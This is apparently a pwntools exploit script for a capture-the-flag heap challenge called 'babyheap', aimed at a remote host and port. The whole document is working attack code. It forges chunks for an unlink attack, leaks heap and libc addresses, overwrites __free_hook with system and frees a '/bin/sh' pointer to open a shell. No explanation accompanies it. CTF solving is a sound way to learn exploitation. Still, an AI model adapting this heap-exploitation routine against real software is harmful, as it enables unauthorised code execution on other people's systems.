from pwn import *
#p = process('./babyheap')
p = remote('106.75.67.115', 9999)
libc = ELF('./libc.so.6')

def alloc(index, content):
	p.recvuntil('Choice:')
	p.sendline('1')
	p.recvuntil('Index:')
	p.sendline(str(index))
	p.recvuntil('Content:')
	if (len(content) == 32):
		p.send(content)
	else:
		p.sendline(content)

def delete(index):
	p.recvuntil('Choice:')
	p.sendline('4')
	p.recvuntil('Index:')
	p.sendline(str(index))

def edit(index, content):
	p.recvuntil('Choice:')
	p.sendline('2')
	p.recvuntil('Index:')
	p.sendline(str(index))
	p.recvuntil('Content:')
	if (len(content) == 32):
		p.send(content)
	else:
		p.sendline(content)

def show(index):
	p.recvuntil('Choice:')
	p.sendline('3')
	p.recvuntil('Index:')
	p.sendline(str(index))
	return p.recvuntil('Done!')[:-6]

alloc(9, p64(0) + p64(1) + p64(0x6020a8 - 0x18) + p64(0x6020a8 - 0x10)) #0
alloc(0, p64(0x31) * 4)
alloc(1, p64(0x31) * 4)
alloc(2, 'dddd')
alloc(6, p64(0x0) + p64(0x91))
alloc(7, p64(0x0) + p64(0x91))
alloc(8, p64(0x0) + p64(0x91)) #2
delete(1)
delete(0)
heap_addr = u64(show(0).ljust(8, '\x00'))
log.info("Heap addr: 0x%x" % heap_addr)
edit(0, p64(heap_addr + 0x20))
alloc(3, 'gggg')
alloc(4, p64(0x80) + p64(0x90) + p64(0x80) + p64(0x90)) #1
delete(2) # unlink
edit(9, p64(0x601f98) + p64(0x601fa0) + p64(0x6020a0) + p64(0x6020a0))
free_addr = u64(show(7).ljust(8, '\x00'))
libc_addr = free_addr - libc.symbols['puts']
log.info("Libc addr: 0x%x" % libc_addr)
edit(9, p64(libc_addr + libc.symbols['__free_hook']) + p64(next(libc.search('/bin/sh')) + libc_addr) + p64(0))
edit(8, p64(libc_addr + libc.symbols['system']))
delete(9)

p.interactive()
